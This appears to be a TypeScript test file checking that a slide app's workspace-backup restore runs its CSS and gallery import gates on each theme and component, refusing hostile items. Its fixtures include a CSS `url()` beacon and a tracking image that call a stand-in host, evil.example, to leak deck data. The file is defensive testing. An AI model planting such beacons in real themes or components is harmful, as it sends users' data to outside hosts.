// A WORKSPACE BACKUP IS A FILE, AND A FILE CAN COME FROM SOMEONE ELSE
// (followups.d/2336-p3-packages-trio-followups.md item 12). `restoreWorkspace` used to hand
// every theme and component in the backup straight to the store, so a backup someone sent you
// skipped the CSS gates and the gallery gate that the Library's `.zip` import runs. It now runs
// the same gates PER ITEM: a refused item is skipped and named, and everything else restores.
//
// The backup is built by the real `packWorkspace` from a real (fake-indexeddb) Library, the way
// a stranger's Studio would write one: the store itself does not refuse hostile CSS, by design
// (`import-gate.ts` says why), so a hostile item can reach a backup file.

import 'fake-indexeddb/auto';
import { beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { installNodeEngine } from '../../test/node-engine';
import { listStudioComponents, saveStudioComponent } from './component-library';
import { deleteAsset, listAssets } from './library/asset-store.js';
import { exportStudioState, importStudioState, loadDeckList, loadSource, saveSource } from './studio-store';
import { listStudioThemes, saveStudioTheme } from './theme-library';
import { packWorkspace, restoreWorkspace } from './workspace-backup';

const T0 = 1_750_000_000_000;
const theme = (name: string, extra = '') => `/* @theme ${name} */\n@import 'lattice';\n:root { --accent: #2f6feb; }\n${extra}`;

beforeAll(installNodeEngine);

beforeEach(async () => {
	for (const a of await listAssets()) await deleteAsset(a.id);
	localStorage.clear();
});

async function hostileBackup(): Promise<Blob> {
	saveSource('deck-aaa', '---\ntheme: brand\n---\n\n# Quarterly plan\n\nHello.');
	const state = exportStudioState();
	state.index.push({ id: 'deck-aaa', title: 'Quarterly plan', builtin: false });
	importStudioState(state, T0);
	await saveStudioTheme({ name: 'brand', label: 'Brand', essentials: {}, css: theme('brand') });
	// A measured false positive of the css-scheme rule (import-gate.ts): it must still restore.
	await saveStudioTheme({ name: 'code', label: 'Code', essentials: {}, css: theme('code', ':root { --code-javascript: #f0db4f; }') });
	await saveStudioTheme({ name: 'beacon', label: 'Beacon', essentials: {}, css: theme('beacon', ':root { --leak: url(https://evil.example/?deck); }') });
	await saveStudioComponent({ name: 'card', css: 'section.card { gap: 2px; }', skeleton: '<!-- _class: card -->\n\n## Card' });
	await saveStudioComponent({ name: 'pixel', css: 'section.pixel { gap: 2px; }', skeleton: '<!-- _class: pixel -->\n\n![x](https://evil.example/p.png)' });
	const blob = await packWorkspace(T0);
	for (const a of await listAssets()) await deleteAsset(a.id);
	localStorage.clear();
	return blob;
}

describe('restoreWorkspace — the import gates, per item', () => {
	it('restores everything else and names each refused item', async () => {
		const summary = await restoreWorkspace(await hostileBackup(), T0 + 60_000);

		expect((await listStudioThemes()).map((t) => t.name).sort()).toEqual(['brand', 'code']);
		expect((await listStudioComponents()).map((c) => c.name)).toEqual(['card']);
		expect(summary.themes).toBe(2);
		expect(summary.components).toBe(1);
		expect(summary.refused.map((r) => r.name).sort()).toEqual(['Beacon', 'pixel']);
		expect(summary.refused.find((r) => r.name === 'Beacon')?.why).toMatch(/remote resource/);

		// The decks are not held hostage by a refused library item.
		expect(loadSource('deck-aaa')).toContain('# Quarterly plan');
		expect(loadDeckList().some((d) => d.title === 'Quarterly plan')).toBe(true);
	});

	it('a clean backup restores in full with nothing refused', async () => {
		await saveStudioTheme({ name: 'brand', label: 'Brand', essentials: {}, css: theme('brand') });
		await saveStudioComponent({ name: 'card', css: 'section.card { gap: 2px; }', skeleton: '<!-- _class: card -->\n\n## Card' });
		const blob = await packWorkspace(T0);
		for (const a of await listAssets()) await deleteAsset(a.id);

		const summary = await restoreWorkspace(blob, T0 + 60_000);
		expect(summary.refused).toEqual([]);
		expect(summary.themes).toBe(1);
		expect(summary.components).toBe(1);
	});
});
